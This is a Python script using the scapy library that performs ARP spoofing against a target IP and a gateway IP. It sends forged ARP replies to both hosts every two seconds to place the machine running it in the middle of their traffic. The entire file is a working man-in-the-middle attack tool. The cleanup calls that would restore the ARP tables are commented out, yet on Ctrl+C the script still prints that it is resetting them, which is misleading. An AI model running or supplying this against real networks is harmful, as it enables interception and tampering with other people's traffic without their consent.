#! /usr/bin/env python

import scapy.all as scapy
import time
import optparse

def get_arguments():
    parser=optparse.OptionParser()
    parser.add_option('-t','--target',dest="target",help="Target IP ")
    parser.add_option('-g','--gateway',dest="gateway",help="Gateway IP")
    options=parser.parse_args()[0]
    if not options.target:
        parser.error("[-] Please specify target ip , use --help for more info ")
    elif not options.gateway:
        parser.error("[-] Please specify gateway ip , use --help for more info ")
    return options
def get_mac(ip):
    arp_request =scapy.ARP(pdst=ip)
    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast =broadcast/arp_request
    answered_list =scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=get_mac(target_ip),psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,verbose=False,count=4)



user_inputs=get_arguments()
target_ip=user_inputs.target
spoof_ip=user_inputs.gateway
packet_sent_count=0
try:
   while True:
     spoof(target_ip,spoof_ip)
     spoof(spoof_ip,target_ip)
     packet_sent_count=packet_sent_count+2
     print("\r[+]Packets sent : "+str(packet_sent_count),end="")
     time.sleep(2)
except KeyboardInterrupt:
     print("\n[+]Detected Ctrl+C ............Resetting ARP table......Please wait")
     #restore(target_ip,spoof_ip)
     #restore(spoof_ip,target_ip)



